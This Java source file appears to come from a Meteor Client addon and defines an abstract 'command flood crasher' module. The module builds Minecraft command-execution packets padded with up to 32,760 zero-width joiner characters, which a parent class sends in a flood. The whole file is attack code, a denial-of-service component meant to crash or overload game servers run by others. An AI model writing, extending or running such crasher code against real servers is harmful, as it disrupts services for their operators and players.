package com.haykkonen.lanyard.modules.crashers.flood;

import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.systems.modules.Category;
import net.minecraft.network.listener.ServerPlayPacketListener;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;
import org.jetbrains.annotations.NotNull;

import java.util.function.Supplier;

public abstract class AbstractCommandFloodCrasher extends AbstractPacketFloodCrasher<ServerPlayPacketListener> {

    protected static final String ZERO_WIDTH_JOINER = "\u200d";
    private static final int MAX_SPAM_SIZE = 32760;

    protected final Setting<Integer> spamSize = sgGeneral.add(new IntSetting.Builder()
            .name("spam-size")
            .description("The size of the spam buffer appended to the command.")
            .defaultValue(256)
            .min(0)
            .max(MAX_SPAM_SIZE)
            .sliderMax(MAX_SPAM_SIZE)
            .build()
    );

    protected AbstractCommandFloodCrasher(@NotNull Category category, @NotNull String name, @NotNull String description) {
        super(category, name, description);
    }

    @Override
    protected @NotNull Supplier<Packet<ServerPlayPacketListener>> createPacketSupplier() {
        String payload = getCommandPayload() + ZERO_WIDTH_JOINER.repeat(spamSize.get());
        final Packet<ServerPlayPacketListener> packet = new CommandExecutionC2SPacket(payload);
        return () -> packet;
    }

    @NotNull
    protected abstract String getCommandPayload();
}
